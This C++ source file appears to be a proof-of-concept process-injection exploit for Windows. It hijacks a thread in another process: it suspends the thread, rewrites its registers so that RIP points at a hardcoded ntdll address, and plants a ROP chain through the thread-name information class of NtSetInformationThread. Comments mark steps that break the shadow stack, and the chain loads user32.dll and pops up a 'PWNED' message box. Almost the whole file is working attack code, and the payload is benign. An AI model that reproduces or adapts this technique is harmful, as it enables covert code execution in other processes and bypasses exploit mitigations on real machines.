// DoubleBarrell.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>

typedef NTSTATUS(*_NtSetInformationThread)(HANDLE, ULONG, PULONG, ULONG);

int main(int argc, char** argv)
{
    int result;
    CONTEXT context;
    __declspec(align(128))
    __int64 threadInformation[2];
    __int64 threadName[0x100];
    threadInformation[0] = sizeof(threadName) | (sizeof(threadName) << 0x10);
    threadInformation[1] = (__int64)threadName;
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " threadID" << std::endl;
        return -1;
    }
    HMODULE ntDll = LoadLibrary(L"ntdll.dll");
    _NtSetInformationThread NtSetInformationThread = (_NtSetInformationThread)GetProcAddress(ntDll, "NtSetInformationThread");
    int threadId = atoi(argv[1]);
    std::cout << "Thread ID:" << std::dec << threadId << std::endl;

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);

    if (!hThread) {
        std::cout << "ERROR couldn't open thread" << std::endl;
        return -2;
    }

    result = SuspendThread(hThread);

    if (result < 0) {
        std::cout << "ERROR couldn't suspend thread" << std::endl;
        return -3;
    }

    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &context);
    std::cout << "RCX: " << std::hex << context.Rcx << std::endl;
    std::cout << "RIP: " << std::hex << context.Rip << std::endl;
    std::cout << "RBP: " << std::hex << context.Rbp << std::endl;
    std::cout << "RSP: " << std::hex << context.Rsp << std::endl;
    std::cout << "R8: " << std::hex << context.R8 << std::endl;
    std::cout << "R9: " << std::hex << context.R9 << std::endl;
    context.ContextFlags |= 0x03;

    context.Rsp = context.Rsp - 0x200 - sizeof(threadName);
    context.Rcx = 0xFFFFFFFFFFFFFFFE;
    context.Rdx = 0x26;
    context.R8 = context.Rsp - 0x18;
    context.R9 = (threadInformation[0] & 0xFFFF) + 0x10;
    context.Rdi = 0;
    context.Rip = 0x7FFEE4F5C777;
    SetThreadContext(hThread, &context);


    // set up shellcode

    threadName[0] = 0x7FFEE4F1C550;
    threadName[1] = 0;
    threadName[2] = 0;
    threadName[3] = context.R8 + 0x80;
    threadName[4] = context.R8 + 0xB8;
    threadName[5] = 0;
    threadName[6] = 0;
    threadName[7] = 0x7FFEE4EA6A10;
    threadName[8] = 0x7FFEE4F1C553;
    // shadow stack break
    threadName[13] = 0x7FFEE4EE4E35;
    threadName[14] = 0x0000000000160014;
    threadName[15] = context.R8 + 0x90;
    threadName[16] = 0x0072006500730075;
    threadName[17] = 0x0064002E00320033;
    threadName[18] = 0x00000000006C006C;
    threadName[19] = 0x7FFEE4F1C550;
    threadName[20] = context.R8 + 0x120;
    threadName[21] = 0;
    threadName[22] = 0;
    threadName[23] = context.R8 + 0x178;
    threadName[24] = 0;
    threadName[25] = 0;
    threadName[26] = 0x7FFEE4F11AD0;
    threadName[27] = 0x7FFEE4EE4E35;
    // shadow stack break
    threadName[33] = 0x7FFEE4F1C553;
    threadName[34] = 0x00000000000C000B;
    threadName[35] = context.R8 + 0x130;
    threadName[36] = 0x426567617373654D;
    threadName[37] = 0x000000000041786F;
    threadName[38] = 0x7FFEE4F1C550;
    threadName[39] = context.R8 + 0x188;
    threadName[40] = 0;
    threadName[41] = context.R8 + 0x190;
    threadName[42] = 0;
    threadName[43] = 0;
    threadName[44] = 0;
    threadName[45] = 0; // MessageBoxA
    threadName[46] = 0x7FFEE4E9DD1B;
    threadName[47] = 0x00313144454E5750;
    threadName[48] = 0x00747577206C6F6C;

    result = NtSetInformationThread(hThread, 0x26, (PULONG) threadInformation, 0x10);

    if (result < 0) {
        std::cout << "Couldn't set thread name: " << std::hex << result << std::endl;
    }

    std::cout << "All done, starting thread again" << std::endl;

    result = ResumeThread(hThread);

    if (result < 0) {
        std::cout << "ERROR couldn't resume thread" << std::endl;
        return -10;
    }

    std::cout << "Hello World!\n";

    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
